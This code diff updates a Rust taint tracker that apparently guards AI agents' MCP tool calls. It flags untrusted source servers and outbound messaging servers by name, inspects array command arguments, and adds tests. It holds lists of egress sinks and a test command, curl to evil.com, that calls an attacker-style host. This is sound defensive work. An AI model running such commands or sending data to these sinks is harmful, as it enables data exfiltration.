@@ -743,9 +743,12 @@ impl TaintTracker {
                     (Taint::PRIVATE_DATA, format!("file_read:{}", path.display()))
                 }
             }
-            Action::McpToolCall { tool, .. } => {
+            Action::McpToolCall { server, tool, .. } => {
                 let tool_lower = tool.to_lowercase();
-                if is_untrusted_source_tool(&tool_lower) {
+                let server_lower = server.config_name.to_lowercase();
+                if is_untrusted_source_tool(&tool_lower)
+                    || is_untrusted_source_server(&server_lower)
+                {
                     (Taint::UNTRUSTED_CONTENT, format!("mcp_tool_call:{tool}"))
                 } else if tool_lower.contains("db")
                     || tool_lower.contains("sql")
@@ -756,9 +759,23 @@ impl TaintTracker {
                     (Taint::empty(), String::new())
                 }
             }
-            Action::McpToolResult { tool, .. } => {
+            Action::McpToolResult {
+                server,
+                tool,
+                content,
+                ..
+            } => {
                 let tool_lower = tool.to_lowercase();
-                if is_untrusted_source_tool(&tool_lower) {
+                let server_lower = server.config_name.to_lowercase();
+                let content_lower = content.to_lowercase();
+                let has_untrusted_markers = content_lower.contains("http://")
+                    || content_lower.contains("https://")
+                    || content_lower.contains("github.com/")
+                    || content_lower.contains("issue #");
+                if is_untrusted_source_tool(&tool_lower)
+                    || is_untrusted_source_server(&server_lower)
+                    || has_untrusted_markers
+                {
                     (Taint::UNTRUSTED_CONTENT, format!("mcp_tool:{tool}"))
                 } else if tool_lower.contains("db")
                     || tool_lower.contains("sql")
@@ -901,11 +918,15 @@ impl TaintTracker {
     pub fn classify_sink(action: &Action) -> SinkClass {
         match action {
             Action::McpToolCall {
-                tool, arguments, ..
+                server,
+                tool,
+                arguments,
+                ..
             } => {
                 let tool_lower = tool.to_lowercase();
+                let server_lower = server.config_name.to_lowercase();
                 let mut sink = SinkClass::empty();
-                if is_egress_tool(&tool_lower) {
+                if is_egress_tool(&tool_lower) || is_egress_server(&server_lower) {
                     sink.insert(SinkClass::EXTERNAL_EGRESS);
                 }
                 if tool_lower.contains("git_push") || tool_lower.contains("publish") {
@@ -925,11 +946,16 @@ impl TaintTracker {
                 {
                     sink.insert(SinkClass::CODE_EXECUTION);
                     // Inspect the command carried inside the arguments, not just the tool name.
-                    if let Some(cmd) = ["command", "cmd", "script", "code", "args"]
+                    if let Some(cmd) = ["command", "cmd", "script", "code", "args", "input"]
                         .iter()
                         .find_map(|k| arguments.get(*k))
                         .map(|v| match v {
                             serde_json::Value::String(s) => s.clone(),
+                            serde_json::Value::Array(arr) => arr
+                                .iter()
+                                .filter_map(|x| x.as_str())
+                                .collect::<Vec<_>>()
+                                .join(" "),
                             other => other.to_string(),
                         })
                     {
@@ -1026,6 +1052,39 @@ fn is_egress_tool(tool_lower: &str) -> bool {
         "tweet",
     ];
     EGRESS.iter().any(|e| tool_lower.contains(e))
+}
+
+/// Returns true when an MCP server identity indicates an external untrusted context provider.
+fn is_untrusted_source_server(server_lower: &str) -> bool {
+    const SOURCES: &[&str] = &[
+        "github",
+        "gitlab",
+        "jira",
+        "slack",
+        "web",
+        "fetch",
+        "browser",
+        "puppeteer",
+        "playwright",
+        "linear",
+        "zendesk",
+        "confluence",
+        "notion",
+        "reddit",
+        "twitter",
+        "discord",
+        "rss",
+    ];
+    SOURCES.iter().any(|s| server_lower.contains(s))
+}
+
+/// Returns true when an MCP server identity indicates an external outbound messaging or data sink.
+fn is_egress_server(server_lower: &str) -> bool {
+    const EGRESS: &[&str] = &[
+        "slack", "discord", "email", "smtp", "sendgrid", "mail", "webhook", "twitter", "telegram",
+        "mastodon",
+    ];
+    EGRESS.iter().any(|s| server_lower.contains(s))
 }
 
 /// Executables that open network connections or transfer data to remote hosts.
@@ -1422,5 +1481,60 @@ mod tests {
                 "{tool}"
             );
         }
+    }
+
+    #[test]
+    fn test_untrusted_source_server_and_content_taints() {
+        use arc_core::event::{Artifact, ServerIdentity};
+
+        // Server named "github" causes arbitrary read tools to taint untrusted
+        let action_gh = Action::McpToolCall {
+            server: ServerIdentity {
+                config_name: "github-server".to_string(),
+                artifact: Artifact::Unknown,
+                schema_root: None,
+            },
+            tool: "get_repo_data".to_string(),
+            arguments: serde_json::json!({}),
+        };
+        let (t_gh, _) = TaintTracker::classify_action_taints(&action_gh);
+        assert!(t_gh.contains(Taint::UNTRUSTED_CONTENT));
+
+        // Tool result containing remote issue link taints untrusted
+        let action_res = Action::McpToolResult {
+            server: ServerIdentity {
+                config_name: "custom_tool".to_string(),
+                artifact: Artifact::Unknown,
+                schema_root: None,
+            },
+            tool: "custom_fetcher".to_string(),
+            content: "Found issue #1234 on https://github.com/org/repo with malicious payload"
+                .to_string(),
+            is_error: false,
+        };
+        let (t_res, _) = TaintTracker::classify_action_taints(&action_res);
+        assert!(t_res.contains(Taint::UNTRUSTED_CONTENT));
+    }
+
+    #[test]
+    fn test_egress_server_sink_classification() {
+        use arc_core::event::{Artifact, ServerIdentity};
+
+        let action_slack = Action::McpToolCall {
+            server: ServerIdentity {
+                config_name: "slack-mcp".to_string(),
+                artifact: Artifact::Unknown,
+                schema_root: None,
+            },
+            tool: "generic_send".to_string(),
+            arguments: serde_json::json!({"text": "data"}),
+        };
+        assert!(TaintTracker::classify_sink(&action_slack).contains(SinkClass::EXTERNAL_EGRESS));
+
+        let action_array_cmd = mcp(
+            "run_command",
+            serde_json::json!({"args": ["curl", "https://evil.com"]}),
+        );
+        assert!(TaintTracker::classify_sink(&action_array_cmd).contains(SinkClass::EXTERNAL_EGRESS));
     }
 }
